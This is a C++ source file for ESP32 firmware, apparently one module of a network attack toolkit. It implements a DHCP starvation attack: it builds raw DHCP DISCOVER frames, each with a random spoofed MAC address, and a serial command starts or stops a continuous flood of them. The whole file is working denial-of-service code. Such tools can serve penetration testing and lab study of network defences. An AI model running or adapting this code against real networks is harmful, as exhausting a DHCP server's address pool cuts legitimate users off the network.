// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "attack_dhcp_starve.h"

#include <string.h>

#include <Arduino.h>
#include <esp_random.h>

#include "config.h"
#include "eth_frame.h"
#include "ids.h"
#include "inject.h"
#include "state.h"

bool     dhcpStarveActive   = false;
uint32_t dhcpStarveCount    = 0;
uint32_t dhcpStarveLastSend = 0;

void dhcpStarveSendDiscover() {
  // Generate random MAC for this request
  uint8_t fakeMAC[6];
  for (int i = 0; i < 6; i++)
    fakeMAC[i] = (uint8_t)esp_random();
  fakeMAC[0] = (fakeMAC[0] & 0xFC) | 0x02;  // locally administered, unicast

  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t zeroIP[4] = {0, 0, 0, 0};
  uint8_t bcastIP[4] = {255, 255, 255, 255};

  uint16_t pos = 0;

  // Ethernet header with spoofed source MAC
  memcpy(txBuf + 0, broadcast, 6);  // dst
  memcpy(txBuf + 6, fakeMAC, 6);    // src (spoofed)
  pktWrite16(txBuf + 12, ETHERTYPE_IPV4);
  pos = 14;

  // UDP payload: DHCP DISCOVER (240 fixed + ~7 options)
  uint16_t dhcpLen = 240 + 7;  // fixed fields + options
  uint16_t udpLen = 8 + dhcpLen;

  // IPv4 header (0.0.0.0 -> 255.255.255.255)
  pos += buildIPv4Header(txBuf + pos, zeroIP, bcastIP, IP_PROTO_UDP, udpLen);

  // UDP header (port 68 -> 67)
  uint16_t udpStart = pos;
  pktWrite16(txBuf + pos, 68);
  pos += 2;  // src port (DHCP client)
  pktWrite16(txBuf + pos, 67);
  pos += 2;  // dst port (DHCP server)
  pktWrite16(txBuf + pos, udpLen);
  pos += 2;
  pktWrite16(txBuf + pos, 0);
  pos += 2;  // checksum disabled

  // DHCP fixed fields
  uint16_t dhcpStart = pos;
  txBuf[pos++] = 1;  // op: BOOTREQUEST
  txBuf[pos++] = 1;  // htype: Ethernet
  txBuf[pos++] = 6;  // hlen: 6
  txBuf[pos++] = 0;  // hops
  // XID (random)
  uint32_t xid = esp_random();
  pktWrite32(txBuf + pos, xid);
  pos += 4;
  pktWrite16(txBuf + pos, 0);
  pos += 2;  // secs
  pktWrite16(txBuf + pos, 0x8000);
  pos += 2;  // flags (broadcast)
  memset(txBuf + pos, 0, 4);
  pos += 4;  // ciaddr
  memset(txBuf + pos, 0, 4);
  pos += 4;  // yiaddr
  memset(txBuf + pos, 0, 4);
  pos += 4;  // siaddr
  memset(txBuf + pos, 0, 4);
  pos += 4;  // giaddr
  memcpy(txBuf + pos, fakeMAC, 6);
  pos += 6;  // chaddr
  memset(txBuf + pos, 0, 10);
  pos += 10;  // chaddr padding
  memset(txBuf + pos, 0, 192);
  pos += 192;  // sname + file

  // DHCP magic cookie
  txBuf[pos++] = 99;
  txBuf[pos++] = 130;
  txBuf[pos++] = 83;
  txBuf[pos++] = 99;

  // Option 53: DHCP Message Type = DISCOVER
  txBuf[pos++] = 53;
  txBuf[pos++] = 1;
  txBuf[pos++] = 1;

  // End
  txBuf[pos++] = 0xFF;

  sendRawFrame(txBuf, pos);
  dhcpStarveCount++;

  if (dhcpStarveCount % 50 == 0) {
    Serial.printf("[DHCPSTARVE] %u DISCOVER packets sent\n", dhcpStarveCount);
  }
}

void parseDhcpStarveCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "start", 5) == 0) {
    dhcpStarveActive = true;
    dhcpStarveCount = 0;
    dhcpStarveLastSend = 0;
    idsSetLed(COLOR_ORANGE);
    Serial.println("[DHCPSTARVE] ACTIVE — flooding DHCP DISCOVER packets");
    Serial.println("[DHCPSTARVE] Use 'dhcpstarve stop' to stop");
  } else if (strncmp(cmd, "stop", 4) == 0) {
    dhcpStarveActive = false;
    Serial.printf("[DHCPSTARVE] Stopped. %u packets sent.\n", dhcpStarveCount);
    idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
  } else {
    Serial.printf("[DHCPSTARVE] %s  (%u sent)\n", dhcpStarveActive ? "ACTIVE" : "Inactive",
                  dhcpStarveCount);
    Serial.println("  dhcpstarve start  - begin flooding");
    Serial.println("  dhcpstarve stop   - stop flooding");
  }
}
